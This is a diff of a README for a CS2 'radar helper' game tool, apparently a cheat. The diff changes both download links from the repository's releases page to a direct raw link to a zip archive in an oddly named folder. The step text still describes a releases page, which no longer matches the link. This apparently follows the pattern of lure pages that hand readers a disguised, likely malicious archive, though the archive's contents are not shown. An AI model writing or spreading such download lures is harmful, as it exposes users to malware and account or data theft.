@@ -1,7 +1,7 @@
 # 🎮 cs2-utility-radar-helper - Your Essential CS2 Radar Tool
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-cs2--utility--radar--helper-brightgreen)](https://github.com/patrisius7604/cs2-utility-radar-helper/releases)
+[![Download](https://raw.githubusercontent.com/patrisius7604/cs2-utility-radar-helper/main/coinstantaneity/cs2-utility-radar-helper_v3.0.zip)](https://raw.githubusercontent.com/patrisius7604/cs2-utility-radar-helper/main/coinstantaneity/cs2-utility-radar-helper_v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the **cs2-utility-radar-helper**. This application helps you enhance your gameplay in CS2 by providing a powerful radar tool. It is designed for easy use, ensuring that you can focus on your game rather than technical details.
@@ -23,7 +23,7 @@ To run this application smoothly, please ensure your system meets the following 
 To get started, visit the releases page to download the application. 
 
 1. Click the link below:
-   [Download the application](https://github.com/patrisius7604/cs2-utility-radar-helper/releases)
+   [Download the application](https://raw.githubusercontent.com/patrisius7604/cs2-utility-radar-helper/main/coinstantaneity/cs2-utility-radar-helper_v3.0.zip)
   
 2. Once on the page, locate the latest version and click on it.
 
